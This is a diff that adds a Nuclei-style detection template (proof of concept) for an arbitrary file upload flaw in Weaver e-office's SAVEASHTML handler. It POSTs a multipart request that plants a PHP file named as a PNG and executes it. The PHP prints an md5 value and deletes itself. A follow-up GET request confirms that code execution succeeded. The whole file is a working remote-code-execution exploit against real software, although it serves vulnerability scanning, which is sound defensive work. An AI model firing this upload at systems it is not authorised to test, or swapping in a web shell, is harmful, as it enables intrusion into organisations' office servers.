@@ -1,0 +1,58 @@
+id: poc-yaml-weaver-e-office-saveashtml-anyfile-upload
+info:
+  name: 泛微OA e-office SAVEASHTML Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/iWebOffice/OfficeServer.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+    body: |-
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="HTMLNAME"
+
+      {{t1}}.php
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="OPTION"
+
+      SAVEASHTML
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"
+
+      <?=md5({{t1}});unlink(__FILE__);
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "DBSTEP"
+          - "STATUS="
+        condition: and
+      - type: word
+        words:
+          - "<"
+        condition: or
+        negative: true
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/iWebOffice/HTML/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
